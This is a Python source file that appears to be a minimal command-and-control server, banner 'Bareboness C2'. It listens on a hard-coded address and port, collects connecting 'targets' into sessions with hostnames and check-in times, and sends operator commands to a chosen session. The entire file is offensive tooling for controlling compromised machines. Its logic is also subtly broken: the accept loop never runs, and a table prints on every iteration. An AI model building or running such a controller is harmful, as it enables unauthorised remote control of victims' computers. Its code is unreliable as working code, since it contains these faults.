import socket
import sys
import threading
import time
from datetime import datetime
from prettytable import PrettyTable


def banner():
    print('╔╗ ┌─┐┬─┐┌─┐┌┐ ┌─┐┌┐┌┌─┐┌─┐ ╔═╗2')
    print('╠╩╗├─┤├┬┘├┤ ├┴┐│ ││││├┤ └─┐ ║ by the Mayor')
    print('╚═╝┴ ┴┴└─└─┘└─┘└─┘┘└┘└─┘└─┘ ╚═╝')


def comm_in(targ_id):
    print('[+] Awaiting response...')
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id):
    while True:
        message = input('send message#> ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                targ_id.close()
                break
            print(response)

def listener_handler():
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def comm_handler():
    while True:
        if kill_flag == 1:
            break
    try:
        remote_target, remote_ip = sock.accept()
        cur_time = time.strftime("%H:%M:%S", time.localtime())
        date = datetime.now()
        time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
        host_name = socket.gethostbyaddr(remote_ip[0])
        if host_name is not None:
            targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record])
            print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
        else:
            targets.append([remote_target, remote_ip[0], time_record])
            print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="") 
    except:
        pass

if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = '192.168.1.66'
        host_port = 2222
    except IndexError:
        print('[-] Command line argument(s) missing. Please try again.')
    except Exception as e:
        print(e)
    listener_handler()
    while True:
        try:
            command = input('Enter command#> ')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Target', 'Check-In Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, 'Placeholder', 'Placeholder', target[1], target[2]])
                        session_counter += 1
                        print(myTable)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[+] Keyboard interrupt issued.')
            kill_flag = 1
            sock.close()
            break
